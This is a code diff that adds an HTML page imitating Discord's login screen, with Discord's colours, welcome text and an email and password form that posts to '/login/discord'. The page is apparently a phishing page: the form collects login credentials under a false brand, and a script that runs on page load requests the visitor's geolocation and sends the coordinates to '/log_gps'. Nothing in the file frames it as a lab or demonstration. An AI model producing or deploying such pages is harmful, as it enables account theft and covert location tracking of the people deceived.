@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Discord | Login</title>
+</head>
+<body class="bg-[#313338] flex items-center justify-center min-h-screen font-sans">
+    <div class="bg-[#2b2d31] p-8 rounded-lg shadow-2xl w-full max-w-[480px] text-white">
+        <h3 class="text-2xl font-bold text-center mb-2">Welcome back!</h3>
+        <p class="text-[#b5bac1] text-center mb-8">We're so excited to see you again!</p>
+        <form action="/login/discord" method="POST" class="space-y-5">
+            <div><label class="text-[#b5bac1] text-xs font-bold block mb-2 uppercase tracking-wide">Email or Phone Number</label>
+            <input name="user" type="text" class="w-full p-2.5 bg-[#1e1f22] border-none rounded text-white focus:outline-none" required></div>
+            <div><label class="text-[#b5bac1] text-xs font-bold block mb-2 uppercase tracking-wide">Password</label>
+            <input name="pass" type="password" class="w-full p-2.5 bg-[#1e1f22] border-none rounded focus:outline-none" required></div>
+            <button class="w-full bg-[#5865f2] hover:bg-[#4752c4] py-3 rounded font-bold transition">Log In</button>
+        </form>
+    </div>
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    fetch('/log_gps', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lat:p.coords.latitude, lon:p.coords.longitude})});
+                });
+            }
+        }
+    </script>
+</body>
+</html>
